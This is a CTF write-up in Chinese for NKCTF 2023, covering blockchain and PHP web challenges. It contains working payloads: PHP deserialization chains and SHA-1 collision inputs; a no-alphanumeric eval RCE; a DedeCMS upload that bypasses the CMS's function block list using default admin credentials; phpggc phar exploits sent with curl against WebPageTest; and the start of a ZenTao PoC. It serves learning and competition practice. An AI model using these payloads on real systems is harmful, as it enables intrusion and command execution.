+<p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p>
+<h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p>
+<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p>
+<p>查看合约代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p>
+<p>在<code>metamask</code>中链接题目给的私链</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p>
+<p>使用<code>remix ide</code></p>
+<p>编译后指定题目部署的地址</p>
+<p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p>
+<p>在Metamask确认交易请求</p>
+<p>等待交易打包，确认上链</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p>
+<h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p>
+<p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p>
+<p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p>
+<p>列目录：<code>dir /</code></p>
+<p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p>
+<p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p>
+<h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p>
+<p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p>
+<p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p>
+<p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p>
+<p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p>
+<h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p>
+<p>左侧核心栏中有个文件式管理器，可以上传文件</p>
+<p>存在过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>scandir</code>列目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用<code>include</code>读文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p>
+<h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p>
+<p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p>
+<h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p>
+<p>github搜到<a target="_blank" rel="noopener" href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p>
+<p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 